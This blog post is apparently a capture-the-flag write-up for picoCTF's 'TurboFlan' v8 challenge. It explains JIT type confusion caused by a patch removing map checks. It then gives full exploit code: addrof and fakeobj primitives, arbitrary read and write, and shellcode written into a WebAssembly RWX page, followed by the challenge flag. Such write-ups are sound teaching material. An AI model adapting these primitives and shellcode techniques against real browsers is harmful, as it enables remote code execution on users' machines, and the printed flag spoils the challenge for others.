---
layout: post
title: picoCTF v8 exploitation, part 2
---
Previously, I went over how to turn an out of bounds read and write into shellcode execution in picoCTF 2021's [Download Horsepower](https://blog.joshwang.me/2021/04/14/picoctf-horsepower/).

However, that vulnerability was fairly contrived; generally, no sane developer would make a function to unsafely set arbitrary lengths of arrays.


It turns out that a lot of v8 exploitation is about tricking the v8 Just-In-Time (JIT) compiler, TurboFan, to make dangerous compiler optimizations which can lead to type confusion.


## TurboFlan
The provided patch removes the calls to `DeoptimizeIfNot(DeoptimizeReason::kWrongMap, ...);` in `EffectControlLinearizer::LowerCheckMaps()`.

v8 is known for its speed, and one way it achieves this is by optimizing hot functions, or functions that get called many times. If it gets called so many times, why not compile it and skip the interpretation each call?

However, such optimization presents the danger of confusing types in passed arguments. So, v8 also includes checks to verify the types of objects that are passed to a JITted function, among other checks too. If a check fails, the optimized code is considered unusable and is "deoptimized", or thrown out.

The patch in TurboFlan basically removes the check that the maps are the same across function calls. If we get a function to be JITted that expects an argument of type `a`, and then give it an argument of type `b`, the function won't be de-optimized and will treat the argument that is actually type `b` as type `a`.

<!-- more -->

### debugging setup
Now comes the confusing part (IMO): getting a JITted function. Honestly, I still do not know the exact determination of whether a function will get JITted or not besides it being "sufficently complex".

But, if JITting wants to seem like a magic black box, we should just treat it as such :P

We can run the d8 binary with certain debug flags to see when things are optimized, deoptimized, and inlined, as well as saving the TurboFan behavior:
- \-\-shell: opens interactive shell after running our script
- \-\-trace-opt: traces TurboFan optimization
- \-\-trace-deopt: traces TurboFan de-optimization
- \-\-trace-turbo-inlining: traces function inlining


### properties of a JSObject
Simliar to elements, properties are stored in an array that is pointed to by the parent JSObject. Here's the [memory layout of a JSObject](https://medium.com/@bpmxmqd/v8-engine-jsobject-structure-analysis-and-memory-optimization-ideas-be30cfcdcd16) again if you need a refresher. The `properties` pointer is basically the same thing as the `elements` pointer, but for non-numeric properties.

From playing around, I am fairly certain that properties are stored in the array in the order that you set them in the array for some reason.

I.E. `o = {a: 1, b: 2}` will have the packed SMI of `1` and then `2` in the `properties`, not the other way around.


### getting a JITted function
A common method of getting a function to be JITted is to call it many times in a for-loop. However, I found that this would just cause the function to be inlined in the loop, and not compiled by TurboFan. So, I had to call the function 3 times in the for-loop:
```javascript
for (var i = 0; i < 0x1000; ++i){
    f(x)
    f(x)
    f(x)
}
```

You can see if a function is actually compiled, inlined, or neither by reading the output from running it in d8 with the debug flags.


### type confusion 1
Let's see how we can type confuse JITted functions now that we can pass differently typed arguments to the same JITted function and have it operated on the same.

To start, I made the following function:
```javascript
function f(o){
    o.a *= 2
    o.c *= 3
    let t = o.b
    return ftoi(t)
}
```

This function returns the `b` property of `o`.

If we JIT `f` and make it expect an object of `string->float`, it will memorize the offset of `b` and just return the data at `properties+offset`.

An example array is `x = {a:5.5, b:1.1, c:2.2, d:3.3}`.

One caveat is that the float values in `x` aren't stored in IEEE754 representation. Instead, the data at the `properties` pointer is full of *pointers to HeapNumbers*, which contain the actual float value.

A float HeapNumber is laid out like:
```
+0 <map *>
+4 <64 bits of IEEE 754 float representation>
```

Recall that an array of floats looks like:
```
+0 <map *>
+4 <properties *>
+8 <elements *>
```

If we can confuse a pointer to a HeapNumber with a pointer to an array of floats, we could leak the `elements` and `properties` of it!

To do this, consider the following:
```javascript
function f(o){
    o.a *= 2
    o.c *= 3
    let t = o.b
    return ftoi(t)
}

x = {a:5.5, b:1.1, c:2.2, d:3.3}

for (var i = 0; i < 0x1000; ++i){
    f(x)
    f(x)
    f(x)
}

y = {a:5, b:[6.9], c:2}

float_elem = f(y) >> 32n
float_prop = f(y) & 0xffffffffn
```

First, `x.b` is a float (1.1), which really means it is a pointer to a HeapNumber within the `properties` pointer of `x`.

Next, `y` is created such that its `properties` will be laid out with the same offsets as `a` (at least until and including `y.b`). However, `y.b` is now an array of floats instead of a HeapNumber containing a single float.

`f()` has been JITted to return `o.b`, so it gets the pointer at `o.b`. It thinks that the value is a HeapNumber, so it returns 64 bits interpreted as an IEEE754 float starting from `+4`.

Now we have leaked the address of the `elements` and `properties` pointer of a float array using type confusion.

### type confusion 2
Just like how `addrof` and `fakeobj` are somewhat inverses, we can try to invert our first type confusion.

We should try to get a function to write values as a HeapNumber, but trick it into overwriting the `elements` and `properties` of an array.

Fortunately it is pretty easy:
```javascript
function g(o, val){
    o.a *= 2
    o.c *= 3

    o.b = itof(val)
}

x = {a:5.5, b:1.1, c:2.2, d:3.3}

for (var i = 0; i < 0x1000; ++i){
    g(x, 1n)
    g(x, 1n)
    g(x, 1n)
}
```

I chose `g()` to get JITted. It expects `o.b` to be a HeapNumber, and writes a supplied value to it, even if `o.b` really isn't a HeapNumber.

I made a second array, `y2`, which is the same as `y` but `y2.b` is an array of *objects*, not an array of floats.

### addrof and fakeobj primitives

We can use our float `elements` and `properties` pointer from our first type confusion, and our `g()` function from our second type confusion.

We can overwrite the `elements` and `properties` pointer of y2 to **point to the elements and properties of y**.

```javascript
y = {a:5, b:[6.9], c:2}

float_elem = f(y) >> 32n
float_prop = f(y) & 0xffffffffn


y2 = {a:5, b:[{}], c:2}
g(y2, (float_elem << 32n) + float_prop)
```

`y.b` thinks everything is a float when it accesses its `elements`.
`y2.b` thinks everything is an object pointer when it accesses its `elements`, but in reality it is accessing the `elements` of `y.b`.

Now, our addrof and fakeobj primitives are very easy:
```javascript
function addrof(o){
    y2.b[0] = o
    return ftoi(y.b[0]) & 0xffffffffn
}

function fakeobj(addr){
    y.b[0] = itof(addr)
    return y2.b[0]
}
```

### controlled read and write
Same idea as in Download Horsepower. Set up a fake array with a float map, then get a fake object within that float map, and control the `elements` pointer of the fake object.

I took advantage of the fact that the v8 heap is notoriously stable, and the float map is allocated very early on, so the address is likely to not change. Because of pointer compression we don't need to worry about getting the full v8 heap base.


```javascript
c = [itof(0x82439f1n), itof((4n << 32n) + 0x69696969n)]

function read(addr){
    if (addr % 2n == 0){
        addr += 1n
    }

    c[1] = itof((4n << 32n) + addr-8n)

    let fake = fakeobj(addrof(c) + 112n + 8n)

    return ftoi(fake[0])
}

function heap_write(addr, data){
    if (addr % 2n == 0){
        addr += 1n
    }
    c[1] = itof((4n << 32n) + addr-8n)

    let fake = fakeobj(addrof(c) + 112n + 8n)

    fake[0] = itof(data)
}
```

### arbitrary write
We can do the same thing we did before in Download Horsepower to get an arbitrary write: modify the backing store of an ArrayBuffer, and write to it.

```javascript
function arb_write32(addr, data){
    if (addr % 2n == 1){
        addr -= 1n
    }

    let dataview = new DataView(evil_buf)


    heap_write(addrof(evil_buf) + 0x14n, addr)


    dataview.setBigUint64(0, data, true)
}


evil_buf = new ArrayBuffer(0x100)

print("evil buf @", hex(addrof(evil_buf)))
```

### remote shellcode execution
Yet again, we can do the same thing we did for Download Horsepower: overwrite the instructions of a WebAssembly instance to our own shellcode.

```javascript
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var pwn = wasm_instance.exports.main;

rwx_page = read(addrof(wasm_instance) + 103n)

print("rwx @", hex(rwx_page))

shellcode = [0xcfe016a, 0x66b84824, 0x2e67616c, 0x50747874, 0x4858026a, 0xf631e789, 0x90050f99, 0x41909090, 0xffffffba, 0xc689487f, 0x6a58286a, 0xf995f01, 0x5]

dataview = new DataView(evil_buf)
heap_write(addrof(evil_buf) + 0x14n, rwx_page)

for(i = 0; i < shellcode.length; ++i){
    dataview.setBigUint64(i*4, BigInt(shellcode[i]), true)
}
```

### script
```javascript
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var pwn = wasm_instance.exports.main;

var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function hex(val){
    return "0x"+val.toString(16)
}

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}


function f(o){
    o.a *= 2
    o.c *= 3
    let t = o.b
    return ftoi(t)
}

function g(o, val){
    o.a *= 2
    o.c *= 3

    o.b = itof(val)
}

x = {a:5.5, b:1.1, c:2.2, d:3.3}

for (var i = 0; i < 0x1000; ++i){
    f(x)
    f(x)
    f(x)

    g(x, 1n)
    g(x, 1n)
    g(x, 1n)
}

y = {a:5, b:[6.9], c:2}

float_elem = f(y) >> 32n
float_prop = f(y) & 0xffffffffn

y2 = {a:5, b:[{}], c:2}
g(y2, (float_elem << 32n) + float_prop)

function addrof(o){
    y2.b[0] = o
    return ftoi(y.b[0]) & 0xffffffffn
}

function fakeobj(addr){
    y.b[0] = itof(addr)
    return y2.b[0]
}

c = [itof(0x82439f1n), itof((4n << 32n) + 0x69696969n)]


function read(addr){
    if (addr % 2n == 0){
        addr += 1n
    }

    c[1] = itof((4n << 32n) + addr-8n)

    let fake = fakeobj(addrof(c) + 112n + 8n)

    return ftoi(fake[0])
}

function heap_write(addr, data){
    if (addr % 2n == 0){
        addr += 1n
    }
    c[1] = itof((4n << 32n) + addr-8n)

    let fake = fakeobj(addrof(c) + 112n + 8n)

    fake[0] = itof(data)
}


function arb_write32(addr, data){
    if (addr % 2n == 1){
        addr -= 1n
    }

    let dataview = new DataView(evil_buf)


    heap_write(addrof(evil_buf) + 0x14n, addr)


    dataview.setBigUint64(0, data, true)
}


evil_buf = new ArrayBuffer(0x100)

print("evil buf @", hex(addrof(evil_buf)))

rwx_page = read(addrof(wasm_instance) + 103n)

print("rwx @", hex(rwx_page))

shellcode = [0xcfe016a, 0x66b84824, 0x2e67616c, 0x50747874, 0x4858026a, 0xf631e789, 0x90050f99, 0x41909090, 0xffffffba, 0xc689487f, 0x6a58286a, 0xf995f01, 0x5]

dataview = new DataView(evil_buf)
heap_write(addrof(evil_buf) + 0x14n, rwx_page)

for(i = 0; i < shellcode.length; ++i){
    dataview.setBigUint64(i*4, BigInt(shellcode[i]), true)
}

pwn()
```

Flag: `picoCTF{Good_job!_Now_go_find_a_real_v8_cve!_4f2661eab1a80e33}`
